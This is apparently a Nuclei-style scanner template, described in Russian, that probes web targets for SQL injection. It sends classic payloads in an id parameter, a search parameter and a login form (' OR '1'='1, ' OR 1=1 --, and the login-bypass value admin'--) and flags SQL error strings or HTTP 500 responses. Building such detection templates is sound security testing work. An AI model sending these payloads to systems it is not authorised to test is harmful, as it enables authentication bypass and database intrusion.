id: custom-sql-injection
info:
  name: Custom SQL Injection Detection
  author: Влад
  severity: critical
  description: >
    Поиск SQL-инъекций с помощью различных полезных нагрузок, включая классические и современные методы. 
    Анализируется ответ сервера на признаки ошибок SQL и отклик на инъекции.
  tags: sql, injection, web, vulnerability

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1' OR '1'='1"
      - "{{BaseURL}}/?id=1' AND '1'='2"
    headers:
      User-Agent: "Mozilla/5.0 (compatible; CustomSQLScanner/1.0)"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "you have an error in your sql syntax"
          - "unclosed quotation mark after the character string"
          - "mysql_fetch_array()"
          - "syntax error"
          - "sql error"
        part: body
      - type: status
        status:
          - 500

  - method: POST
    path:
      - "{{BaseURL}}/login"
    body: "username=admin'--&password=123"
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "mysql_num_rows()"
          - "syntax error"
          - "warning"
        part: body
      - type: status
        status:
          - 500

  - method: GET
    path:
      - "{{BaseURL}}/?search=' OR 1=1 --"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "sql syntax"
          - "mysql_fetch"
          - "syntax error"
          - "mysql_num_rows"
        part: body

